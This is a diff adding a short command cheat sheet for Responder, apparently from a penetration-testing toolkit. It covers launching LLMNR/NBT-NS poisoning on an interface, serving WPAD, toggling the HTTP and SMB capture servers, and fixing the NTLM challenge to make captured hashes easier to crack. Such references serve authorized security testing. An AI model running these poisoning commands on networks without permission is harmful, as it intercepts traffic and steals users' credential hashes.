@@ -1,0 +1,29 @@
+% responder,llmnr,poisoning,mitm,infrastructure
+
+# Launch responder on interface
+responder -I <interface>
+
+# Analyze mode (no poisoning)
+responder -I <interface> -A
+
+# Launch with WPAD file
+responder -I <interface> --wpad
+
+# Enable HTTP in Responder config
+sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && \
+cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
+
+# Disable HTTP in Responder config
+sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && \
+cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
+
+# Enable SMB in Responder config
+sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && \
+cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
+
+# Disable SMB in Responder config
+sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && \
+cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
+
+# Set NTLM challenge for cracking
+sed -i 's/Challenge =.*/Challenge = <challenge>/' /opt/tools/Responder/Responder.conf
